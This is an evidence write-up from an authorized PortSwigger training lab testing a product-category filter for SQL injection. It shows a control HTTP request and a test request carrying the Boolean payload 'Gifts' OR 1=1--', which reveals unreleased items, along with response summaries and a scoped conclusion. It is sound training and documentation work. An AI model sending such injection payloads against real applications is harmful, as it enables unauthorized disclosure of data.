# WEB-001 Evidence, SQL Injection

## Authorization
- **Lab alias**: LAB-WEB-01
- **Named PortSwigger lab**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- **Test date**: 2026-09-08

## Hypothesis
The category input changes server-side query logic because it is not safely parameterized. If the parameter is concatenated directly into a database `WHERE` clause, appending a true Boolean condition will bypass the application's filtration rules and force the data layer to expose hidden, unreleased inventory items.

## Control request
```http
GET /filter?category=Gifts HTTP/2
Host: REDACTED_LAB_HOST
Cookie: session=REDACTED_SESSION_STRING
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
```

## Control response summary
- **Status**: 200 OK
- **Length**: 10,412 bytes
- **Released products visible**: Corpse Bride Corpse, Waterproof Teabag, Bungee Jump Umbrella
- **Unreleased product visible**: No

## Test request
```http
GET /filter?category=Gifts'+OR+1%3d1-- HTTP/2
Host: REDACTED_LAB_HOST
Cookie: session=REDACTED_SESSION_STRING
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
```

## Test response summary
- **Status**: 200 OK
- **Length**: 18,743 bytes
- **Additional products visible**: Simulated corporate inventory expansion including multiple hidden items outside the standard "Gifts" classification parameters.
- **Unreleased product visible**: Yes (Confirmed by looking at the page source delta and identifying unreleased internal development packages).

## Conclusion
- **Outcome**: Fail (The application failed the security test case, proving vulnerability existence)
- **Reproduced**: Yes
- **Minimum impact proven**: Unauthorized information disclosure. An unauthenticated attacker can alter query logic over the network to bypass release restrictions and extract hidden business inventory data structures.
- **Test stopped after**: Visual verification of unreleased inventory items in the server's HTML response payload. No database fingerprinting, multi-table structural union joins, or credential extractions were attempted.
- **Evidence label**: Tested on authorized training lab

